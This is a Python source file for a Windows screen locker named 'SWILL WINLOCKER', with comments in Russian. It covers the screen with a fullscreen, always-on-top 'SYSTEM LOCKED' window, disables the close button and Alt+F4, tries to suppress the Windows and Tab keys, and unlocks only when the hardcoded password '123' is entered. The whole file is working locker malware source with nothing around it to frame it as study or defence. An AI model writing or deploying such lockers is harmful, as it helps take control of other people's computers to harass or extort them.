# SWILL WINLOCKER | PASS: 123
import tkinter as tk
import win32api
import win32con
import win32gui
import os

PASSWORD = "123"
attempts = 0

def check_password():
    global attempts
    if entry.get() == PASSWORD:
        status_label.config(text="ACCESS GRANTED - SWILL", fg="green")
        root.after(1000, unlock)
    else:
        attempts += 1
        status_label.config(text=f"WRONG! Attempts: {attempts}", fg="red")
        entry.delete(0, tk.END)

def unlock():
    root.destroy()
    os._exit(0)

def disable_keys():
    # Блокировка системных клавиш
    win32api.keybd_event(win32con.VK_LWIN, 0, win32con.KEYEVENTF_KEYUP, 0)
    win32api.keybd_event(win32con.VK_TAB, 0, win32con.KEYEVENTF_KEYUP, 0)

# Создание окна
root = tk.Tk()
root.title("SWILL LOCKER")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='#8B0000')

# Отключение закрытия
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Стиль
label = tk.Label(root, text="SYSTEM LOCKED", font=("Consolas", 36, "bold"), fg="red", bg="#8B0000")
label.pack(pady=50)

status_label = tk.Label(root, text="Enter password to unlock", font=("Consolas", 14), fg="white", bg="#8B0000")
status_label.pack()

entry = tk.Entry(root, show="*", font=("Consolas", 18), width=20, justify="center")
entry.pack(pady=20)
entry.focus()

btn = tk.Button(root, text="UNLOCK", command=check_password, font=("Consolas", 14), bg="black", fg="red")
btn.pack(pady=10)

# Привязка Enter
root.bind('<Return>', lambda event: check_password())

# Блокировка Alt+F4
root.bind('<Alt-F4>', lambda e: 'break')

# Запуск
root.mainloop()